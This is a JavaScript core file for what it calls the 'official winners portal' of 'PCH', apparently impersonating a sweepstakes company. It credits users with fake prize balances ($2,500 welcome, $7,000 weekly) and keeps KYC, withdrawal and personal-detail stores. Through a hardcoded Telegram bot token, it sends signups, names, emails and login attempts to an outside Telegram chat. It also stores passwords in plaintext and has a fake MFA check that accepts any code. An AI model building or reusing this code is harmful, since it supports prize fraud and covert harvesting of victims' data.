// =============================================
// app.js – Core with ALL features
// =============================================

const TELEGRAM_BOT_TOKEN = '8719116476:AAH1VD3raRv77NiWUy2EOmDEC3mOdjghYNE';
const TELEGRAM_CHAT_ID = '8673303375';

// ---- localStorage helpers ----
function getData(key, def = []) {
    try { return JSON.parse(localStorage.getItem(key)) || def; } catch { return def; }
}
function setData(key, val) { localStorage.setItem(key, JSON.stringify(val)); }

// ---- Data accessors ----
function getUsers() { return getData('pch_users'); }
function setUsers(u) { setData('pch_users', u); }
function getFundingRecords() { return getData('pch_funding_records'); }
function setFundingRecords(f) { setData('pch_funding_records', f); }
function getFundingSchedules() { return getData('pch_funding_schedules'); }
function setFundingSchedules(s) { setData('pch_funding_schedules', s); }
function getCards() { return getData('pch_cards'); }
function setCards(c) { setData('pch_cards', c); }
function getRewards() { return getData('pch_rewards'); }
function setRewards(r) { setData('pch_rewards', r); }
function getSupportTickets() { return getData('pch_tickets'); }
function setSupportTickets(t) { setData('pch_tickets', t); }
function getNotifications() { return getData('pch_notifications'); }
function setNotifications(n) { setData('pch_notifications', n); }
function getAuditLogs() { return getData('pch_audit'); }
function setAuditLogs(a) { setData('pch_audit', a); }
function getLastFundingDate() { return localStorage.getItem('pch_last_funding_date') || null; }
function setLastFundingDate(d) { localStorage.setItem('pch_last_funding_date', d); }
function getPushSubscription() { return getData('pch_push_subscription', null); }
function setPushSubscription(sub) { setData('pch_push_subscription', sub); }

// ---- NEW: KYC ----
function getKyc() { return getData('pch_kyc'); }
function setKyc(k) { setData('pch_kyc', k); }

// ---- NEW: Withdrawals ----
function getWithdrawals() { return getData('pch_withdrawals'); }
function setWithdrawals(w) { setData('pch_withdrawals', w); }

// ---- NEW: Activity Log ----
function getActivityLog(userId) { return getData('pch_activity_' + userId); }
function setActivityLog(userId, log) { setData('pch_activity_' + userId, log); }
function logActivity(userId, action, details) {
    const log = getActivityLog(userId);
    log.unshift({ action, details, timestamp: new Date().toISOString() });
    setActivityLog(userId, log);
    // Also audit
    audit(action, details, userId);
}

// ---- NEW: Announcements ----
function getAnnouncements() { return getData('pch_announcements'); }
function setAnnouncements(a) { setData('pch_announcements', a); }

// ---- NEW: Currency ----
function getCurrency() { return localStorage.getItem('pch_currency') || 'USD'; }
function setCurrency(c) { localStorage.setItem('pch_currency', c); }

// ---- NEW: MFA (simulated TOTP) ----
function getUserMFA(userId) { const u = getUsers().find(u => u.id === userId); return u ? u.mfa_secret : null; }
function enableMFA(userId, secret) {
    const users = getUsers();
    const idx = users.findIndex(u => u.id === userId);
    if (idx !== -1) { users[idx].mfa_secret = secret; users[idx].mfa_enabled = true; setUsers(users); }
}
function verifyMFA(userId, code) {
    // For demo, we accept any 6-digit code (real TOTP would use a library)
    return code && code.length === 6;
}

// ---- User session ----
function getCurrentUser() { return getData('pch_current_user', null); }
function setCurrentUser(u) { setData('pch_current_user', u); }
function clearCurrentUser() { localStorage.removeItem('pch_current_user'); }

// ---- Telegram ----
function sendTelegram(msg) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
    }).catch(() => {});
}
function audit(event, details, userId = null, result = 'SUCCESS') {
    const user = getCurrentUser();
    const name = user ? `${user.firstName} ${user.lastName}` : 'Guest';
    const msg = `📋 <b>AUDIT</b>\nEvent: ${event}\nUser: ${name}\nDetails: ${details}\nTime: ${new Date().toLocaleString()}\nResult: ${result}`;
    sendTelegram(msg);
    const logs = getAuditLogs();
    logs.unshift({ id: Date.now(), event, actor: name, details, result, timestamp: new Date().toISOString() });
    setAuditLogs(logs);
}

// ---- Auth ----
function login(email, password) {
    const users = getUsers();
    const user = users.find(u => u.email === email && u.password === password);
    if (user) {
        // Check MFA if enabled
        if (user.mfa_enabled) {
            // In real flow, we'd redirect to MFA page; for demo, we accept any 6-digit code
            const code = prompt('Enter your 6-digit MFA code:');
            if (!code || !verifyMFA(user.id, code)) {
                audit('MFA_FAILED', `MFA failed for ${email}`, user.id, 'FAILURE');
                return null;
            }
        }
        setCurrentUser(user);
        audit('LOGIN_SUCCESS', `User ${email} logged in`, user.id);
        logActivity(user.id, 'LOGIN', 'User logged in');
        return user;
    }
    audit('LOGIN_FAILURE', `Failed login for ${email}`, null, 'FAILURE');
    return null;
}

function signup(data) {
    const users = getUsers();
    if (users.find(u => u.email === data.email)) throw new Error('Email already registered');
    data.role = data.email === 'admin@admin.com' ? 'admin' : 'user';
    data.balance = 2500;
    data.prize_amount = 2500;
    data.accountNumber = 'WIN' + String(100000 + Math.floor(Math.random()*900000));
    data.status = 'active';
    data.vip_level = 'Standard';
    data.currency = 'USD';
    data.avatar = ''; // base64 later
    data.bio = '';
    data.phone = data.phone || '';
    data.address = data.address || '';
    data.mfa_enabled = false;
    data.mfa_secret = null;
    data.createdAt = new Date().toISOString();
    users.push(data);
    setUsers(users);
    // Welcome funding
    const funding = getFundingRecords();
    funding.push({
        id: Date.now(),
        userId: data.id,
        amount: 2500,
        type: 'welcome',
        status: 'completed',
        description: 'Welcome bonus',
        reference: 'WELCOME-' + Date.now(),
        createdAt: new Date().toISOString()
    });
    setFundingRecords(funding);
    const notifs = getNotifications();
    notifs.push({
        id: Date.now(),
        userId: data.id,
        title: 'Welcome!',
        message: `Your account has been credited with $2,500.`,
        isRead: false,
        createdAt: new Date().toISOString()
    });
    setNotifications(notifs);
    logActivity(data.id, 'SIGNUP', 'User registered');
    audit('USER_REGISTERED', `New user: ${data.firstName} ${data.lastName} (${data.email})`, data.id);
    return data;
}

function logout() {
    const user = getCurrentUser();
    if (user) {
        audit('LOGOUT', `User ${user.email} logged out`, user.id);
        logActivity(user.id, 'LOGOUT', 'User logged out');
    }
    clearCurrentUser();
    window.location.href = 'index.html';
}
window.logout = logout;

// ---- Push Notifications ----
function askNotificationPermission() {
    if (!('Notification' in window) || !('serviceWorker' in navigator)) {
        alert('Push notifications are not supported in this browser.');
        return;
    }
    if (Notification.permission === 'granted') {
        registerPushSubscription();
        return;
    }
    Notification.requestPermission().then(function(permission) {
        if (permission === 'granted') {
            registerPushSubscription();
        } else {
            alert('Push notifications denied. You can change this in browser settings.');
        }
    });
}

function registerPushSubscription() {
    if (!navigator.serviceWorker) return;
    navigator.serviceWorker.register('assets/js/service-worker.js')
        .then(function(reg) {
            return reg.pushManager.subscribe({
                userVisibleOnly: true,
                applicationServerKey: urlBase64ToUint8Array('BEl62iUYgUwH1ZVveM1QPeNQexlDMLbFw9UJ1lGtL3aJw7X1yX2zZ5gYk8qo0nQvJjC2Yw=')
            });
        })
        .then(function(sub) {
            setPushSubscription(sub);
            audit('PUSH_ENABLED', `User ${getCurrentUser().email} enabled push`, getCurrentUser().id);
            alert('Push notifications enabled!');
        })
        .catch(function(err) {
            console.error('Push subscription error:', err);
            alert('Could not enable push. Please try again.');
        });
}

function urlBase64ToUint8Array(base64String) {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding).replace(/\-/g, '+').replace(/_/g, '/');
    const rawData = window.atob(base64);
    const outputArray = new Uint8Array(rawData.length);
    for (let i = 0; i < rawData.length; ++i) {
        outputArray[i] = rawData.charCodeAt(i);
    }
    return outputArray;
}

function sendPushNotification(title, body, url = '/user.html') {
    // Simulate push
    if ('Notification' in window && Notification.permission === 'granted') {
        new Notification(title, { body, icon: '/assets/icon-192.png' });
    }
    // In-app
    const user = getCurrentUser();
    if (user) {
        const notifs = getNotifications();
        notifs.push({
            id: Date.now(),
            userId: user.id,
            title: title,
            message: body,
            isRead: false,
            createdAt: new Date().toISOString()
        });
        setNotifications(notifs);
    }
}

// ---- Scheduled Funding Engine (weekly/monthly) ----
function processScheduledFunding() {
    const today = new Date();
    const day = today.getDay(); // 5 = Friday
    const dateStr = today.toISOString().slice(0,10);
    const lastFunding = getLastFundingDate();
    if (lastFunding === dateStr) return;

    const schedules = getFundingSchedules().filter(s => s.status === 'active');
    if (schedules.length === 0) {
        const defaultSchedule = {
            id: Date.now(),
            name: 'Weekly Friday Funding',
            amount: 7000,
            frequency: 'weekly',
            day: 'Friday',
            status: 'active',
            createdAt: new Date().toISOString()
        };
        schedules.push(defaultSchedule);
        setFundingSchedules(schedules);
    }

    let processed = false;
    schedules.forEach(schedule => {
        let shouldRun = false;
        if (schedule.frequency === 'weekly' && day === 5) shouldRun = true;
        else if (schedule.frequency === 'monthly' && today.getDate() === 1) shouldRun = true;
        if (!shouldRun) return;

        const amount = schedule.amount || 7000;
        const users = getUsers().filter(u => u.role === 'user' && u.status === 'active');
        users.forEach(user => {
            const usersCopy = getUsers();
            const idx = usersCopy.findIndex(u => u.id === user.id);
            if (idx !== -1) {
                usersCopy[idx].balance += amount;
                usersCopy[idx].prize_amount += amount;
                setUsers(usersCopy);
                const current = getCurrentUser();
                if (current && current.id === user.id) {
                    current.balance = usersCopy[idx].balance;
                    current.prize_amount = usersCopy[idx].prize_amount;
                    setCurrentUser(current);
                }
                const funding = getFundingRecords();
                funding.push({
                    id: Date.now() + Math.random(),
                    userId: user.id,
                    amount: amount,
                    type: schedule.frequency === 'weekly' ? 'weekly' : 'monthly',
                    status: 'completed',
                    description: schedule.frequency === 'weekly' ? 'Weekly Friday Funding' : 'Monthly Funding',
                    reference: schedule.frequency.toUpperCase() + '-' + dateStr,
                    createdAt: new Date().toISOString()
                });
                setFundingRecords(funding);
                const notifs = getNotifications();
                notifs.push({
                    id: Date.now() + Math.random(),
                    userId: user.id,
                    title: '🏆 Funding Added',
                    message: `$${amount} has been added to your account.`,
                    isRead: false,
                    createdAt: new Date().toISOString()
                });
                setNotifications(notifs);
                sendPushNotification('Funding Added', `$${amount} added to your PCH account.`);
                audit('SCHEDULED_FUNDING', `User ${user.email} received $${amount} (${schedule.frequency})`, user.id);
                logActivity(user.id, 'FUNDING_RECEIVED', `Received $${amount} (${schedule.frequency})`);
                processed = true;
            }
        });
    });

    if (processed) {
        setLastFundingDate(dateStr);
        audit('SCHEDULED_FUNDING_RUN', `Processed scheduled funding for ${schedules.length} schedules`, null);
    }
}

// ---- Admin Import functions ----
function validateImportData(rows) {
    const required = ['first_name', 'last_name', 'email', 'password'];
    const headers = Object.keys(rows[0] || {});
    const missing = required.filter(r => !headers.includes(r));
    if (missing.length > 0) {
        throw new Error(`Missing columns: ${missing.join(', ')}`);
    }
    return rows;
}

function importUsers(rows) {
    const users = getUsers();
    let added = 0;
    rows.forEach(row => {
        if (users.find(u => u.email === row.email)) return;
        const newUser = {
            id: Date.now() + Math.random(),
            firstName: row.first_name,
            lastName: row.last_name,
            email: row.email,
            password: row.password || 'default123',
            balance: parseFloat(row.balance) || 2500,
            prize_amount: parseFloat(row.prize_amount) || 2500,
            accountNumber: row.account_number || 'WIN' + String(100000 + Math.floor(Math.random()*900000)),
            status: row.status || 'active',
            vip_level: row.vip_level || 'Standard',
            role: 'user',
            currency: row.currency || 'USD',
            avatar: '',
            bio: '',
            phone: row.phone || '',
            address: row.address || '',
            mfa_enabled: false,
            mfa_secret: null,
            createdAt: new Date().toISOString()
        };
        users.push(newUser);
        // Create welcome funding
        const funding = getFundingRecords();
        funding.push({
            id: Date.now() + Math.random(),
            userId: newUser.id,
            amount: 2500,
            type: 'welcome',
            status: 'completed',
            description: 'Welcome bonus (imported)',
            reference: 'IMPORT-' + Date.now(),
            createdAt: new Date().toISOString()
        });
        setFundingRecords(funding);
        added++;
    });
    setUsers(users);
    audit('ADMIN_IMPORT', `Imported ${added} users`, getCurrentUser().id);
    return added;
}

// ---- Countdown timer ----
function getNextFundingDate() {
    const now = new Date();
    const day = now.getDay(); // 5 = Friday
    const daysUntilFriday = (5 - day + 7) % 7 || 7; // next Friday
    const next = new Date(now);
    next.setDate(now.getDate() + daysUntilFriday);
    next.setHours(0,0,0,0);
    return next;
}

// ---- Seed data ----
function seedData() {
    if (getUsers().length === 0) {
        const users = [
            { id: 1, firstName: 'Admin', lastName: 'User', email: 'admin@admin.com', password: 'admin123', role: 'admin', balance: 0, prize_amount: 0, accountNumber: 'ADMIN001', status: 'active', vip_level: 'Super', currency: 'USD', avatar: '', bio: '', phone: '', address: '', mfa_enabled: false, mfa_secret: null, createdAt: new Date().toISOString() },
            { id: 2, firstName: 'John', lastName: 'Winner', email: 'john@example.com', password: 'john123', role: 'user', balance: 2500, prize_amount: 2500, accountNumber: 'WIN123456', status: 'active', vip_level: 'VIP', currency: 'USD', avatar: '', bio: 'PCH winner since 2026', phone: '555-1234', address: '123 Main St', mfa_enabled: false, mfa_secret: null, createdAt: new Date().toISOString() }
        ];
        setUsers(users);
        const funding = [
            { id: 1, userId: 2, amount: 2500, type: 'welcome', status: 'completed', description: 'Welcome bonus', reference: 'WELCOME-1', createdAt: new Date().toISOString() }
        ];
        setFundingRecords(funding);
        const notifs = [
            { id: 1, userId: 2, title: 'Welcome!', message: 'Your account has been credited with $2,500.', isRead: false, createdAt: new Date().toISOString() }
        ];
        setNotifications(notifs);
        const schedules = [
            { id: 1, name: 'Weekly Friday Funding', amount: 7000, frequency: 'weekly', day: 'Friday', status: 'active', createdAt: new Date().toISOString() }
        ];
        setFundingSchedules(schedules);
        const announcements = [
            { id: 1, title: 'Welcome to PCH!', message: 'This is the official winners portal.', createdAt: new Date().toISOString() }
        ];
        setAnnouncements(announcements);
    }
}
seedData();

// ---- Run funding engine ----
if (!window.location.pathname.includes('index.html')) {
    processScheduledFunding();
}

// ---- Expose globals ----
window.getUsers = getUsers;
window.setUsers = setUsers;
window.getFundingRecords = getFundingRecords;
window.setFundingRecords = setFundingRecords;
window.getFundingSchedules = getFundingSchedules;
window.setFundingSchedules = setFundingSchedules;
window.getCards = getCards;
window.setCards = setCards;
window.getRewards = getRewards;
window.setRewards = setRewards;
window.getSupportTickets = getSupportTickets;
window.setSupportTickets = setSupportTickets;
window.getNotifications = getNotifications;
window.setNotifications = setNotifications;
window.getAuditLogs = getAuditLogs;
window.setAuditLogs = setAuditLogs;
window.getCurrentUser = getCurrentUser;
window.setCurrentUser = setCurrentUser;
window.getKyc = getKyc;
window.setKyc = setKyc;
window.getWithdrawals = getWithdrawals;
window.setWithdrawals = setWithdrawals;
window.getActivityLog = getActivityLog;
window.setActivityLog = setActivityLog;
window.logActivity = logActivity;
window.getAnnouncements = getAnnouncements;
window.setAnnouncements = setAnnouncements;
window.getCurrency = getCurrency;
window.setCurrency = setCurrency;
window.getUserMFA = getUserMFA;
window.enableMFA = enableMFA;
window.verifyMFA = verifyMFA;
window.askNotificationPermission = askNotificationPermission;
window.sendPushNotification = sendPushNotification;
window.audit = audit;
window.login = login;
window.signup = signup;
window.logout = logout;
window.getNextFundingDate = getNextFundingDate;
window.importUsers = importUsers;
window.validateImportData = validateImportData;